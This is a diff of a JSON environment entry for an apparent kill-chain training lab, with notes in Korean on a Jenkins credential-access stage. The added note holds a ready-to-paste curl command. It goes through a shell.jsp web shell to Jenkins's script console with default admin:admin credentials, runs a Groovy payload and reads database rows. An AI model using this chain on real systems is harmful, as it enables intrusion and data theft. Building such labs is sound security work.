@@ -1,5 +1,5 @@
 {
-  "_note": "핵심층 환경 — corp 킬체인 ★★ crown 접근의 유일 열쇠. Jenkins 2.138 VulHub(기본 자격증명 admin:admin) 스크립트 콘솔 Groovy 실행 → /opt/deploy/corp-db.properties 읽어 크라운 DB 자격증명 수집. ★ crown PostgreSQL 자격증명은 postgres:postgres 가 아니라 랜덤화된 corp_svc:<16자 랜덤> — 추측 불가, 반드시 이 KG 로 선행 획득해야 crown 접근 가능. killchain-1(ShopFlow)과 같은 T1552.001 기법·다른 절차. 크라운 반출은 corp-crown-read(T1213)가 담당. 진행도 선저작.",
+  "_note": "핵심층 환경 — corp 킬체인 ★★★ Jenkins 피벗 = crown 접근의 유일 열쇠. 호스트: jenkins.corp-internal.svc.cluster.local:8080 (Tomcat shell.jsp 발판에서 env 변수 JENKINS_URL 로도 노출). 기본 자격증명: admin:admin (VulHub 공식 교육 이미지, init.groovy 자동 생성). ★ shell.jsp 발판 획득 직후 복붙 완주 명령: curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20-u%20admin%3Aadmin%20--data-urlencode%20%27script%3Devaluate%28new%20File%28%22%2Fopt%2Fpayload%2Fcrown-read.groovy%22%29.text%29%27%20http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2FscriptText' → CROWN_COLS/CROWN_ROW 즉시 반환. ★ crown PostgreSQL 자격증명은 postgres:postgres 가 아니라 랜덤화된 corp_svc:<16자 랜덤> — 추측 불가능, /opt/deploy/corp-db.properties 는 Tomcat 발판이 아닌 Jenkins Pod 내부에만 존재. killchain-1(ShopFlow)과 같은 T1552.001 기법·다른 절차. 크라운 반출은 corp-crown-read(T1213)가 담당.",
   "env": "corp-jenkins-cred",
   "technique": "T1552.001",
   "cve": "CVE-2018-1000861",
